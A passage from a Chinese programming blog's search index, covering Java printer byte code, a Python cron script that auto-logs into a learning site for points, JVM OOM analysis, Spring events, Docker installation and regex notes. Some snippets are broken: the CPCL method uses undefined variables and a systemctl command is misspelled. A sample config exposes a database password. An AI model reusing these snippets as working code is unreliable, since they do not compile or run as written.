来保存记录了缓存实例的配置，也就是说，如果第一个缓存初始化了缓存配置，第二个缓存通过 area 和 cacheName 来查询，发现已经有了配置，就直接拿来使用。\n最终解决，如果要使两个缓存实例使用不一样的配置，那就要使两个缓存实例的 area 或者 cacheName 不一样。完结\u0026hellip;..\n"},{"id":22,"href":"/posts/2022/%E4%BD%BF%E7%94%A8js%E8%A7%A3%E7%A0%81GB18030%E7%BC%96%E7%A0%81%E7%9A%84Base64%E5%AD%97%E7%AC%A6%E4%B8%B2/","title":"使用js解码 Gb18030编码的 Base64字符串","section":"博客","content":"背景：后端使用GB18030字节编码加密成Base64后，在前端解码。\n使用工具类进行解码 https://github.com/inexorabletash/text-encoding\n1、先生成Uint8 字节buffer\nvar binary_string = window.atob(base64Cmd); var len = binary_string.length; var bytes = new Uint8Array(len); for (var i = 0; i \u0026lt; len; i++) { bytes[i] = binary_string.charCodeAt(i); } buffer = bytes.buffer; 2、再使用Uint8 字节buffer生成对应的中文编码字符串\nvar str = new TextDecoder(\u0026#39;gb18030\u0026#39;).decode(buffer); "},{"id":23,"href":"/posts/2022/CPCL%E6%8C%87%E4%BB%A4%E6%89%93%E5%8D%B0%E5%9B%BE%E7%89%87/","title":"Cpcl指令打印图片","section":"博客","content":" public String graphics(int x0, int y0, int width, int height, BufferedImage bmp) { if (bmp != null) { //生成2进制字符串 int[] rgb = new int[3]; width = bmp.getWidth(); height = bmp.getHeight(); int wModByte = (width % 8) == 0 ? 0 : 8 - (width % 8); int pixelCount = (width + wModByte) * height; int wPrintByte = (width + wModByte) / 8; StringBuilder res = new StringBuilder(); for (int y = 0; y \u0026lt; height; y++) { for (int x = 0; x \u0026lt; width; x++) { int pixel = bmp.getRGB(x, y); // 下面三行代码将一个数字转换为RGB数字 rgb[0] = (pixel \u0026amp; 0xff0000) \u0026gt;\u0026gt; 16; rgb[1] = (pixel \u0026amp; 0xff00) \u0026gt;\u0026gt; 8; rgb[2] = (pixel \u0026amp; 0xff); String bitStr = (rgb[0] + rgb[1] + rgb[2]) / 3 \u0026gt;= 200 ? \u0026#34;1\u0026#34; : \u0026#34;0\u0026#34;; res.append(bitStr); } for (int k = 0; k \u0026lt; wModByte; k++) { res.append(\u0026#34;1\u0026#34;); } } //生成二值图字节流 String x = res.toString(); for (int i = 0; i \u0026lt; binary2.length(); i = i + 8) { String substring = binary2.substring(i, i + 8); String hex = Long.toHexString(Long.parseLong(substring,2)); if(hex.length() == 1) { hex = \u0026#34;0\u0026#34; + hex; } else if(hex.length() \u0026gt; 2) { hex = hex.substring(hex.length() - 2); } hexStr.append(hex); } StringJoiner sj = new StringJoiner(\u0026#34; \u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\\r\\n\u0026#34;); sj.add(\u0026#34;EG\u0026#34;).add(String.valueOf(wPrintByte)).add(String.valueOf(height)) .add(String.valueOf(x0)).add(String.valueOf(y0)).add(hexStr.toString()); return sj.toString(); } return \u0026#34;\u0026#34;; } private String toHexString(byte[] bytes) { StringBuilder sb = new StringBuilder(); for(Byte b : bytes) { String hex = Integer.toHexString(b.intValue()).toUpperCase(); if(hex.length() == 1) { hex = \u0026#34;0\u0026#34; + hex; } else if(hex.length() \u0026gt; 2) { hex = hex.substring(hex.length() - 2); } sb.append(hex); } return sb.toString(); } "},{"id":24,"href":"/posts/2022/%E5%86%99%E4%B8%AApython%E8%84%9A%E6%9C%AC%E6%AF%8F%E5%A4%A9%E5%AE%9A%E6%97%B6%E7%99%BB%E5%BD%95/","title":"写个python脚本，每天定时登录","section":"博客","content":"写一个脚本，每天登录获取积分。\n使用的语法是python3，系统是centos7。\n1、安装http请求需要的requests模块，直接使用pip3来安装\npip install requests 也可以到官网去下载源文件来安装 https://pypi.org/project/requests/\n2、编写python脚本，文件名称：lmsLogin.py\n#!/bin/python3 import re import requests from urllib import parse users = [ {\u0026#39;user\u0026#39;: \u0026#39;xxx\u0026#39;, \u0026#39;pwd\u0026#39;: \u0026#39;xxx\u0026#39;}, {\u0026#39;user\u0026#39;: \u0026#39;xxx\u0026#39;, \u0026#39;pwd\u0026#39;: \u0026#39;xxx\u0026#39;} ] for user in users: res = requests.get(url = \u0026#39;https://lms.qinsilk.com/login\u0026#39;) pattern = re.compile(r\u0026#39;\u0026lt;meta content=\u0026#34;(.*)?\u0026#34; name=\u0026#34;csrf-token\u0026#34;\u0026#39;, re.M|re.I) token = pattern.findall(res.text, 0)[0] print(token) cookie = requests.utils.dict_from_cookiejar(res.cookies) print (cookie) url = r\u0026#39;https://lms.qinsilk.com/login_check\u0026#39; headers = { \u0026#39;origin\u0026#39;: \u0026#39;https://lms.qinsilk.com\u0026#39;, \u0026#39;content-type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;, \u0026#39;User-Agent\u0026#39;: r\u0026#39;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36\u0026#39;, \u0026#39;Referer\u0026#39;: r\u0026#39;https://lms.qinsilk.com/login\u0026#39;, \u0026#39;Connection\u0026#39;: \u0026#39;keep-alive\u0026#39; } datas = { \u0026#39;_username\u0026#39;: user[\u0026#39;user\u0026#39;], \u0026#39;isMayday\u0026#39;: 0, \u0026#39;_password\u0026#39;: user[\u0026#39;pwd\u0026#39;], \u0026#39;_remember_me\u0026#39;: \u0026#39;on\u0026#39;, \u0026#39;_target_path\u0026#39;: \u0026#39;\u0026#39;, \u0026#39;_csrf_token\u0026#39;: token } data = parse.urlencode(datas).encode(\u0026#39;utf-8\u0026#39;) print(data) postRes = requests.post(url = url, data = datas, headers = headers, cookies = cookie) print(postRes) 3、设置定时任务每天执行\nvim /etc/crontab #输入以下内容,每天6点登录 0 6 * * * root python3 /root/lmsLogin/lmsLogin.py \u0026gt;\u0026gt; /root/lmsLogin/index.log # 重启crond systemctl resart crond "},{"id":25,"href":"/posts/2022/OOM%E5%A0%86%E6%A0%88%E4%BF%A1%E6%81%AF%E5%88%86%E6%9E%90/","title":"Oom堆栈信息分析","section":"博客","content":"先把一台有问题的服务从微服务摘下来，其他服务重启，保证线上运行正常，然后在这台服务上进行分析原因。\n1、打印GC日志\nJAVA_OPTS=\u0026#34;$JAVA_OPTS -server -Xms4096m -Xmx4096m -Xss1024k -XX:PermSize=256m -XX:MaxPermSize=256m -XX:+PrintGCDetails -Xloggc:/usr/local/gc.log -XX:+PrintGCTimeStamps\u0026#34; 查看GC情况（Minor GC、Major GC、Full GC）\ntail -n 50 gc.log 2、查看CPU占用情况\njps top -H -p [pid] 3、把堆栈信息导出来\njstack pid \u0026gt; jst.txt jmap -dump:format=b,file=jdump.bin pid -dump: 生成Java堆转储快照 -heap：显示Java堆详细信息 -histo：显示堆中对象统计信息 同时也可以使用 jmap -histo \u0026lt;PID\u0026gt; | grep [过滤类] 查看一下有没有哪个类对象过多，如果有，可能就是这里的问题了。 分析堆栈信息：Memory Analyzer tools:AMT\noverview -\u0026gt; See stacktrace，可以看见栈信息\n然后点击details，查看这个GC不掉的内存对象是谁，找到自己写的内存对象。\n然后去分析代码，为什么会出现这种情况。\n"},{"id":26,"href":"/posts/2022/%E6%89%93%E5%8D%B0%E6%A8%AA%E6%8E%92%E4%BA%8C%E7%BB%B4%E7%A0%81/","title":"打印横排二维码","section":"博客","content":"public class PrintQrCode3Test { public static void main(String[] args) throws Exception { // 最多3组 List\u0026lt;KeyValue\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); list.add(KeyValue.generator(\u0026#34;80\u0026#34;, getStr(28))); list.add(KeyValue.generator(\u0026#34;80\u0026#34;, getStr(44))); list.add(KeyValue.generator(\u0026#34;80\u0026#34;, getStr(74))); System.out.println(toHexString(qrCode3Map(list))); } public static String getStr(Integer len) { return StringUtil.leftPad(\u0026#34;\u0026#34;, len, \u0026#34;zxcvbnmasdfghjklqwertyuiop.:/.:/\u0026#34;); } public static byte[] qrCode3Map(List\u0026lt;KeyValue\u0026gt; content) { byte[] byteMerger = new byte[0]; // byte[] init = new byte[]{0x1B, 0x1D, 0x1E, 0x00, 0x0C, 0x04, 0x1B, 0x1D, 0x1F, 0x1B, 0x40}; byte[] init = new byte[]{0x1B, 0x40}; byteMerger = byteMerger(byteMerger, init); int w = 880; int h = 380; int w_pL = w%256; int w_pH = w/256; int h_pL = h%256; int h_pH = h/256; byte[] start = new byte[]{0x1B,0x4C,0x1B,0x57,0x00,0x00,0x00,0x00,(byte) w_pL,(byte) w_pH,(byte)h_pL,(byte)h_pH,0x0A}; byteMerger = byteMerger(byteMerger, start); for (int i = 0; i \u0026lt; content.size(); i++) { String text = content.get(i).getValue(); int size = content.get(i).getKey(); Integer pager = content.get(i).getPager(); int x = (pager*8 / content.size()) * i + 20; // byte[] crtiPrintAnddot = new byte[]{0x1D, 0x24, 0x00, 0x00, 0x1B, 0x24, (byte) (x % 256), (byte) (x / 256)}; byte[] crtiPrintAnddot = new byte[]{0x1B, 0x24, (byte) (x % 256), (byte) (x / 256)}; byte[] qrcodeSize = new byte[]{29, 40, 107, 3, 0, 49, 67, (byte) size}; byte[] qrcodeData = {29, 40, 107, (byte) ((text.getBytes().length + 3) % 256), (byte) ((text.getBytes().length + 3) / 256), 49, 80, 48}; byte[] qrcodeText = text.getBytes(); byte[] printQrcode = {29, 40, 107, 3, 0, 49, 81, 48}; byteMerger = byteMerger(byteMerger, crtiPrintAnddot); byteMerger = byteMerger(byteMerger, qrcodeSize); byteMerger = byteMerger(byteMerger, qrcodeData); byteMerger = byteMerger(byteMerger, qrcodeText); byteMerger = byteMerger(byteMerger, printQrcode); System.out.println(String.format(\u0026#34;%s - %s - %s\u0026#34;, size, text.length(), text)); } byte[] end = new byte[]{10, 12, 24, 13}; byteMerger = byteMerger(byteMerger, end); byte[] oc = new byte[] {0x0A,0x0A,0x0A,0x0A,0x0A,0x0A}; byteMerger = byteMerger(byteMerger, oc); return byteMerger; } public static byte[] byteMerger(byte[] bt1, byte[] bt2) { byte[] bt3 = new byte[bt1.length + bt2.length]; System.arraycopy(bt1, 0, bt3, 0, bt1.length); System.arraycopy(bt2, 0, bt3, bt1.length, bt2.length); return bt3; } public static String toHexString(byte[] bytes) { StringBuilder sb = new StringBuilder(); for(byte b : bytes) { String hex = Integer.toHexString(b).toUpperCase(); if(hex.length() == 1) { hex = \u0026#34;0\u0026#34; + hex; } else if(hex.length() \u0026gt; 2) { hex = hex.substring(hex.length() - 2); } sb.append(hex).append(\u0026#34; \u0026#34;); } return sb.toString(); } public static void printStr(byte[] decode) { try { System.out.println(new String(decode, \u0026#34;GB18030\u0026#34;)); } catch (UnsupportedEncodingException e) { e.printStackTrace(); } } static class KeyValue { private Integer key; private String value; private Integer pager; public KeyValue(Integer key, String value, Integer pager) { this.key = key; this.value = value; this.pager = pager; } public static KeyValue generator(String page, String value) { // 取正整数(9 - 取正整数(85 / 20)) int pager = Integer.parseInt(page); try { int x = 0; if (\u0026#34;58\u0026#34;.equals(page)) { x = 3; } else if (\u0026#34;80\u0026#34;.equals(page)) { x = 2; } int len = value.getBytes(\u0026#34;GB2312\u0026#34;).length; Integer key = Math.max((9 - Math.max(((len + x * 20 ) / 20), 0)), 0); if (\u0026#34;58\u0026#34;.equals(page) \u0026amp;\u0026amp; len \u0026gt;= 80) { key = 3; } if (\u0026#34;80\u0026#34;.equals(page) \u0026amp;\u0026amp; len \u0026gt;= 80) { key = 4; } if (\u0026#34;110\u0026#34;.equals(page) \u0026amp;\u0026amp; len \u0026gt;= 80) { key = 5; } return new KeyValue(key, value, pager); } catch (UnsupportedEncodingException e) { e.printStackTrace(); return new KeyValue(5, value, pager); } } public Integer getPager() { return pager; } public void setPager(Integer pager) { this.pager = pager; } public Integer getKey() { return key; } public void setKey(Integer key) { this.key = key; } public String getValue() { return value; } public void setValue(String value) { this.value = value; } } } "},{"id":27,"href":"/posts/2022/%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B%E5%B7%A5%E5%8E%82/","title":"创建一个线程工厂","section":"博客","content":"区分其他线程，监控线程。\nclass NamedThreadFactory implements ThreadFactory { private static final AtomicInteger POOL_NUMBER = new AtomicInteger(1); private final AtomicInteger THREAD_NUMBER; private final ThreadGroup GROUP; private final String NAME_PREFIX; private final boolean IS_DAEMON; NamedThreadFactory() { this(\u0026#34;test-thread-factory\u0026#34;); } NamedThreadFactory(String name) { this(name, false); } NamedThreadFactory(String preffix, boolean daemon) { this.THREAD_NUMBER = new AtomicInteger(0); SecurityManager s = System.getSecurityManager(); this.GROUP = s != null ? s.getThreadGroup() : Thread.currentThread().getThreadGroup(); this.NAME_PREFIX = preffix + \u0026#34;-\u0026#34; + POOL_NUMBER.getAndIncrement() + \u0026#34;-thread-\u0026#34;; this.IS_DAEMON = daemon; } @Override public Thread newThread(Runnable r) { Thread t = new Thread(this.GROUP, r, this.NAME_PREFIX + this.THREAD_NUMBER.getAndIncrement(), 0L); t.setDaemon(this.IS_DAEMON); if (t.getPriority() != Thread.NORM_PRIORITY) { t.setPriority(Thread.NORM_PRIORITY); } return t; } } "},{"id":28,"href":"/posts/2022/ApplicationEvent%E5%92%8CListener%E5%AE%9E%E7%8E%B0%E4%B8%9A%E5%8A%A1%E8%A7%A3%E8%80%A6/","title":"Application Event和 Listener实现业务解耦","section":"博客","content":"ApplicationEvent以及Listener是Spring为我们提供的一个事件监听、订阅的实现，内部实现原理是观察者设计模式，设计初衷是为了系统业务逻辑解耦，提高可扩展性及可维护性。事件发布者并不需要考虑谁去监听，监听具体的内容是什么，发布者的工作只是为了发布时间而已。\n创建并发布 ApplicationEvent 事件 # 1、创建一个ApplicationEvent事件实体,只要 extends ApplicationEvent，作用于发布事件时\npublic class UserEvent extends ApplicationEvent { private UserVO userVO; public UserEvent(Object source, UserVO userVO) { super(source); this.userVO = userVO; } public UserVO getUserVO() { return userVO; } public void setUserVO(UserVO userVO) { this.userVO = userVO; } } 2、创建一个业务Servie，并发布ApplicationEvent事件\n@Service @Transactional public class UserService { @Resource private UserDao userDao; @Resource private ApplicationContext applicationContext; public void testSave() { UserVO userVO = new UserVO(); userVO.setName(\u0026#34;123\u0026#34;); userVO.setAge(18); userDao.save(userVO); applicationContext.publishEvent(new UserEvent(this, userVO)); System.out.println(\u0026#34;123123\u0026#34;); try { Thread.sleep(2000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(\u0026#34;123456\u0026#34;); } } 3、创建一个事务监听器，事务提交后，执行发布的内容\n@Component public class UserListener { @TransactionalEventListener public void register(UserEvent userEvent) { // 获取用户对象 UserVO userVO = userEvent.getUserVO(); // 打印信息 System.out.println(\u0026#34;事务提交，执行\u0026#34;); } } Listener # 可以同时监听一个事件执行不同的逻辑\n@EventListener @TransactionalEventListener ApplicationListener SmartApplicationListener 1、@EventListener 事件发布后马上执行\n@Component public class UserListener { @EventListener public void register(UserEvent userEvent) { // 获取用户对象 UserVO userVO = userEvent.getUserVO(); // 打印信息 System.out.println(\u0026#34;发布后，马上执行\u0026#34;); } } 2、@TransactionalEventListener 事务提交后，才执行事件\n@Component public class UserListener { @TransactionalEventListener public void register(UserEvent userEvent) { // 获取用户对象 UserVO userVO = userEvent.getUserVO(); // 打印信息 System.out.println(\u0026#34;事务提交，执行\u0026#34;); } } 3、ApplicationListener 原始方式实现，用户注册监听\n@Component public class User2Listener implements ApplicationListener\u0026lt;UserEvent\u0026gt; { @Override public void onApplicationEvent(UserEvent userEvent) { // 获取用户对象 UserVO userVO = userEvent.getUserVO(); // 打印信息 System.out.println(\u0026#34;执行\u0026#34;); } } 4、SmartApplicationListener 实现有序监听\n@Component public class User3Listener implements SmartApplicationListener { @Override public boolean supportsEventType(Class\u0026lt;? extends ApplicationEvent\u0026gt; aClass) { // 只有UserEvent监听类型才会执行下面逻辑 return aClass == UserEvent.class; } @Override public boolean supportsSourceType(Class\u0026lt;?\u0026gt; sourceType) { // 只有在UserService内发布的事件类型是UserRegisterEvent事件时，才会执行下面逻辑 return sourceType == UserService.class; } @Override public int getOrder() { // 同步情况下监听执行顺序，数值越小证明优先级越高，执行顺序越靠前 return 0; } @Override public String getListenerId() { // 监听ID return SmartApplicationListener.super.getListenerId(); } @Override public void onApplicationEvent(ApplicationEvent applicationEvent) { // 获取用户对象 UserEvent userEvent = (UserEvent) applicationEvent; UserVO userVO = userEvent.getUserVO(); // 打印信息 System.out.println(\u0026#34;User3Listener执行\u0026#34;); } } 其他基本类 # 添加依赖创建一个简单项目来测试\npom.xml文件：\n\u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;druid-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.6\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-data-jpa\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.projectlombok\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;lombok\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;RELEASE\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;compile\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; application.yaml文件：\nspring: datasource: url: jdbc:mysql://127.0.0.1:3306/test?useUnicode=true\u0026amp;characterEncoding=UTF-8\u0026amp;useSSL=false driver-class-name: com.mysql.cj.jdbc.Driver username: root password: yuanmoc type: com.alibaba.druid.pool.DruidDataSource jpa: #这个参数是在建表的时候，将默认的存储引擎切换为 InnoDB 用的 database-platform: org.hibernate.dialect.MySQL5InnoDBDialect #配置在日志中打印出执行的 SQL 语句信息。 show-sql: true hibernate: #配置指明在程序启动的时候要删除并且创建实体类对应的表 ddl-auto: update application: name: springboot-test 实体\n@Entity @Table(name = \u0026#34;user\u0026#34;) public class UserVO { @Id @GeneratedValue(strategy = GenerationType.AUTO) private Integer id; @Column(name = \u0026#34;name\u0026#34;) private String name; @Column(name = \u0026#34;age\u0026#34;) private Integer age; public String getName() { return name; } public void setName(String name) { this.name = name; } public Integer getAge() { return age; } public void setAge(Integer age) { this.age = age; } public void setId(Integer id) { this.id = id; } public Integer getId() { return id; } } dao\n@Repository public interface UserDao extends JpaRepository\u0026lt;UserVO, Integer\u0026gt; { } controller\n@Controller @ResponseBody public class UserController { @Resource private UserService userService; @RequestMapping(\u0026#34;/test\u0026#34;) public String test() { userService.testSave(); return \u0026#34;success\u0026#34;; } } "},{"id":29,"href":"/posts/2022/%E5%88%9B%E5%BB%BA%E7%BA%BF%E7%A8%8B%E6%B1%A0/","title":"创建线程池","section":"博客","content":"ThreadPoolExecutor executor = new ThreadPoolExecutor(5, 20, 2, TimeUnit.MINUTES, new LinkedBlockingQueue\u0026lt;\u0026gt;()); "},{"id":30,"href":"/posts/2022/centos7%E5%AE%89%E8%A3%85Docker/","title":"Centos7安装 Docker","section":"博客","content":" 在centos7 上安装 Docker # 安装\n# step 1: 安装必要的一些系统工具 sudo yum install -y yum-utils device-mapper-persistent-data lvm2 # Step 2: 添加软件源信息 sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo # Step 3: 更新并安装 Docker-CE sudo yum makecache fast sudo yum -y install docker-ce # Step 4: 开启Docker服务 sudo service docker start 注意：其他注意事项在下面的注释中 # 官方软件源默认启用了最新的软件，您可以通过编辑软件源的方式获取各个版本的软件包。例如官方并没有将测试版本的软件源置为可用，你可以通过以下方式开启。同理可以开启各种测试版本等。 # vim /etc/yum.repos.d/docker-ce.repo # 将 [docker-ce-test] 下方的 enabled=0 修改为 enabled=1 # # 安装指定版本的Docker-CE: # Step 1: 查找Docker-CE的版本: # yum list docker-ce.x86_64 --showduplicates | sort -r # Loading mirror speeds from cached hostfile # Loaded plugins: branch, fastestmirror, langpacks # docker-ce.x86_64 17.03.1.ce-1.el7.centos docker-ce-stable # docker-ce.x86_64 17.03.1.ce-1.el7.centos @docker-ce-stable # docker-ce.x86_64 17.03.0.ce-1.el7.centos docker-ce-stable # Available Packages # Step2 : 安装指定版本的Docker-CE: (VERSION 例如上面的 17.03.0.ce.1-1.el7.centos) # sudo yum -y install docker-ce-[VERSION] # 注意：在某些版本之后，docker-ce安装出现了其他依赖包，如果安装失败的话请关注错误信息。例如 docker-ce 17.03 之后，需要先安装 docker-ce-selinux。 # yum list docker-ce-selinux- --showduplicates | sort -r # sudo yum -y install docker-ce-selinux-[VERSION] # 通过经典网络、VPC网络内网安装时，用以下命令替换Step 2中的命令 # 经典网络： # sudo yum-config-manager --add-repo http://mirrors.aliyuncs.com/docker-ce/linux/centos/docker-ce.repo # VPC网络： # sudo yum-config-manager --add-repo http://mirrors.could.aliyuncs.com/docker-ce/linux/centos/docker-ce.repo 安装检验\ndocker version 安装Docker-compose # 地址：https://github.com/docker/compose/releases\n下载：如果要安装新版本，只要把1.29.2改成对应的版本号就可以 curl -L \u0026#34;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)\u0026#34; -o /usr/local/bin/docker-compose 添加可执行权限： chmod +x /usr/local/bin/docker-compose 安装检验： docker-compose version 更换阿里源 # 地址：https://cr.console.aliyun.com/ 选择：镜像工具 -\u0026gt; 镜像加速器\n配置镜像加速器\n针对Docker客户端版本大于 1.10.0 的用户\n您可以通过修改daemon配置文件/etc/docker/daemon.json来使用加速器\nsudo mkdir -p /etc/docker sudo tee /etc/docker/daemon.json \u0026lt;\u0026lt;-\u0026#39;EOF\u0026#39; { \u0026#34;registry-mirrors\u0026#34;: [\u0026#34;https://c9msosvw.mirror.aliyuncs.com\u0026#34;] } EOF sudo systemctl daemon-reload sudo systemctl restart docker "},{"id":31,"href":"/posts/2022/Mysqlon%E4%BD%BF%E7%94%A8%E9%81%87%E5%9D%91/","title":"Mysqlon使用遇坑","section":"博客","content":"本来想查询分组下id最大的一条数据，语句如下：\nselect * from order_delivery where id in ( select max(id) id from order_delivery where cid \u0026gt;= _IN_CUR_ID and cid \u0026lt; _IN_CUR_ID + _IN_STEP and update_time \u0026gt; \u0026#39;2021-03-01\u0026#39; group by cid, delivery_type ); 结果发现，on下的子语句不走索引了。数据太多，结果跑不动了。\n改了一下，先排序再分组查询，这样避免了on子查询的使用，成功走上了索引。\nselect * from (select * from order_delivery where cid \u0026gt;= _IN_CUR_ID and cid \u0026lt; _IN_CUR_ID + _IN_STEP and update_time \u0026gt; \u0026#39;2021-03-01\u0026#39; order by id desc) t group by cid, delivery_type; "},{"id":32,"href":"/posts/2022/MyBatis%E6%89%93%E5%8D%B0%E6%97%A5%E5%BF%97/","title":"My Batis打印日志","section":"博客","content":"在Mybatis 的配置文件中添加：\n\u0026lt;settings\u0026gt; \u0026lt;!-- 打印查询语句 --\u0026gt; \u0026lt;setting name=\u0026#34;logImpl\u0026#34; value=\u0026#34;STDOUT_LOGGING\u0026#34; /\u0026gt; \u0026lt;/settings\u0026gt; 同时可以配合IDEA插件 MyBatis Log Plugin 一起使用。\n"},{"id":33,"href":"/posts/2022/%E6%AD%A3%E5%88%99%E5%B0%8F%E8%AE%B0/","title":"正则小记","section":"博客","content":" 常用元字符 # 代码 说明 . 匹配除换行符以外的任意字符 \\w 匹配字母或数字或下划线 \\s 匹配任意的空白符 \\d 匹配数字 \\b 匹配单词的开始或结束 ^ 匹配字符串的开始 $ 匹配字符串的结束 常用限定符 # 代码/语法 说明 * 重复零次或更多次 + 重复一次或更多次 ? 重复零次或一次 {n} 重复n次 {n,} 重复n次或更多次 {n,m} 重复n到m次 常用反义词 # 代码/语法 说明 \\W 匹配任意不是字母，数字，下划线，汉字的字符 \\S 匹配任意不是空白符的字符 \\D 匹配任意非数字的字符 \\B 匹配不是单词开头或结束的位置 [^x] 匹配除了x以外的任意字符 [^aeiou] 匹配除了aeiou这几个字母以外的任意字符 贪婪匹配/其他 # 字符 描述 (pattern) 匹配 pattern 并获取这一匹配。所获取的匹配可以从产生的 Matches 集合得到，在VBScript 中使用 SubMatches 集合，在JScript 中则使用 $0…$9 属性。要匹配圆括号字符，请使用 \u0026lsquo;(\u0026rsquo; 或 \u0026lsquo;)\u0026rsquo;。 (?:pattern) 匹配 pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用 \u0026ldquo;或\u0026rdquo; 字符 (|) 来组合一个模式的各个部分是很有用。例如， \u0026lsquo;industr(?:y|ies) 就是一个比 \u0026lsquo;industry|industries\u0026rsquo; 更简略的表达式。 (?=pattern) 正向肯定预查（look ahead positive assert），在任何匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，\u0026ldquo;Windows(?=95|98|NT|2000)\u0026ldquo;能匹配\u0026quot;Windows2000\u0026quot;中的\u0026quot;Windows\u0026rdquo;，但不能匹配\u0026quot;Windows3.1\u0026quot;中的\u0026quot;Windows\u0026rdquo;。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。 (?!pattern) 正向否定预查(negative assert)，在任何不匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如\u0026quot;Windows(?!95|98|NT|2000)\u0026ldquo;能匹配\u0026quot;Windows3.1\u0026quot;中的\u0026quot;Windows\u0026rdquo;，但不能匹配\u0026quot;Windows2000\u0026quot;中的\u0026quot;Windows\u0026quot;。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。 (?\u0026lt;=pattern) 反向(look behind)肯定预查，与正向肯定预查类似，只是方向相反。例如，\u0026quot;`(?\u0026lt;=95 (?\u0026lt;!pattern) 反向否定预查，与正向否定预查类似，只是方向相反。例如\u0026quot;`(?\u0026lt;!95 修饰符（标记flags） # /pattern/flags 如：全局匹配g /pattern/g 修饰符 含义 描述 i ignore - 不区分大小写 将匹配设置为不区分大小写，搜索时不区分大小写: A 和 a 没有区别。 g global - 全局匹配 查找所有的匹配项。 m multi line - 多行匹配 使边界字符 ^ 和 $ 匹配每一行的开头和结尾，记住是多行，而不是整个字符串的开头和结尾。 s 特殊字符圆点 . 中包含换行符 \\n 默认情况下的圆点 . 是 匹配除换行符 \\n 之外的任何字符，加上 s 修饰符之后, . 中包含换行符 \\n。 运算符优先级 # 运算符 描述 \\ 转义符 (), (?:), (?=), [] 圆括号和方括号 *, +, ?, {n}, {n,}, {n,m} 限定符 ^, $, \\任何元字符、任何字符 定位点和序列（即：位置和顺序） | 替换，\u0026ldquo;或\u0026quot;操作 字符具有高于替换运算符的优先级，使得\u0026quot;m|food\u0026quot;匹配\u0026quot;m\u0026quot;或\u0026quot;food\u0026rdquo;。若要匹配\u0026quot;mood\u0026quot;或\u0026quot;food\u0026quot;，请使用括号创建子表达式，从而产生\u0026quot;(m|f)ood\u0026quot;。 "},{"id":34,"href":"/posts/2022/jdk8@FunctionalInterface%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"Jdk8@ Functional Interface的使用","section":"博客","content":"简介\njava 8引入了lambda表达式，lambda表达式实际上表示的就是一个匿名的function。\n在java 8之前，如果需要使用到匿名function需要new一个类的实现，但是有了lambda表达式之后，一切都变的非常简介。\n我们看一个之前讲线程池的时候的一个例子：\n//ExecutorService using class ExecutorService executorService = Executors.newSingleThreadExecutor(); executorService.submit(new Runnable() { @Override public void run() { log.info(\u0026#34;new runnable\u0026#34;); } }); executorService.submit需要接收一个Runnable类，上面的例子中我们new了一个Runnable类，并实现了它的run（）方法。\n上面的例子如果用lambda表达式来重写，则如下所示：\n//ExecutorService using lambda executorService.submit(()-\u0026gt;log.info(\u0026#34;new runnable\u0026#34;)); 看起是不是很简单，使用lambda表达式就可以省略匿名类的构造，并且可读性更强。\n那么是不是所有的匿名类都可以用lambda表达式来重构呢？也不是。\n我们看下Runnable类有什么特点：\n@FunctionalInterface public interface Runnable Runnable类上面有一个@FunctionalInterface注解。这个注解就是我们今天要讲到的Functional Interface。\nFunctional Interface # Functional Interface是指带有 @FunctionalInterface 注解的interface。它的特点是其中只有一个子类必须要实现的abstract方法。如果abstract方法前面带有default关键字，则不做计算。\n其实这个也很好理解，因为Functional Interface改写成为lambda表达式之后，并没有指定实现的哪个方法，如果有多个方法需要实现的话，就会有问题。\n@Documented @Retention(RetentionPolicy.RUNTIME) @Target(ElementType.TYPE) public @interface FunctionalInterface {} Functional Interface一般都在java.util.function包中。\n根据要实现的方法参数和返回值的不同，Functional Interface可以分为很多种，下面我们分别来介绍。\nFunction：一个参数一个返回值 # Function接口定义了一个方法，接收一个参数，返回一个参数。\n@FunctionalInterface public interface Function\u0026lt;T, R\u0026gt; { /** * Applies this function to the given argument. * * @param t the function argument * @return the function result */ R apply(T t)； } 一般我们在对集合类进行处理的时候，会用到Function。\nMap\u0026lt;String, Integer\u0026gt; nameMap = new 